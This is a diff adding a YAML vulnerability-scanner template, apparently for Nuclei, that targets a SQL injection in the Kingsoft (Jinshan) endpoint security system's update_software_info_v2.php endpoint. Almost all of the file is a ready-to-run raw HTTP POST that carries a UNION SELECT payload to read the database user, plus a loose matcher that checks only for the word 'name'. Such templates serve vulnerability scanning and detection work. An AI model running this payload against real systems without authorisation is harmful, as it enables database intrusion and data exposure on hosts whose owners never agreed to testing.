@@ -1,0 +1,28 @@
+id: jinshan-update_software_info_v2-sql
+
+info:
+  name: jinshan-update_software_info_v2-sql
+  author: sadasd
+  severity: medium
+  description: 由于金山终端安全系统未对用户的输入进行有效地过滤，直接将其拼接进了SQL查询语句中，导致系统出现SQL注入漏洞
+  reference:
+  - https://github.com/
+
+http:
+- raw:
+  - |
+    @timeout: 30s
+    POST /inter/update_software_info_v2.php HTTP/1.1
+    Host: {{Hostname}}
+    Content-Type: application/x-www-form-urlencoded
+    Content-Length: 71
+
+    type=-1+UNION+SELECT+1,user(),3,4,5,6,7,8--&key=&pageCount=0&curPage=
+
+  max-redirects: 3
+  matchers-condition: and
+  matchers:
+  - type: word
+    words:
+    - name
+    condition: and
